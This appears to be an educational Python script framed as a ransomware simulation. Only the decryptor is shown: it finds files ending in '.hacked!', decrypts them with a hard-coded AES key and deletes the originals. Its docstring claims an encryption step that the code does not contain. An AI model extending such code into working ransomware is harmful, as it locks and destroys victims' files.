"""

Simple script to simulate the procedure of a Ransomware attack
The script encrypts and decrypts target files'

"""""
_author_ = "Victor Marquez"
_version_ =0.1

import os
from pathlib import Path
from Crypto.Cipher import AES


def detectFiles(mainPath):
    for entry in os.scandir(mainPath):
        if entry.is_file():
            yield entry

def decryptFile(file, Pkey):


    #Read file
    dataFIle = file
    with open(dataFIle, 'rb') as f:
        nonce, tag, cipheredtext = [f.read(x) for x in (16,16,-1)]



    #Decrypt the data with the key

    cipher = AES.new(Pkey, AES.MODE_EAX,nonce)
    text = cipher.decrypt_and_verify(cipheredtext,tag)


    #Save data
    fileName = file.name.removesuffix(file.suffix)
    fileExtension = ".decrypted"
    encFile = "Folder Path"+fileName + fileExtension
    with open(encFile, 'wb') as f:
        f.write(text)
        f.close()
        os.remove(file)




for file in detectFiles("FILE PATH"):
    print(file)
    filePath = Path(file)
    fileType = filePath.suffix.lower()
    print(fileType)
    if fileType in ['.hacked!']:
        decryptFile(filePath,b'Sixyeen byte key')
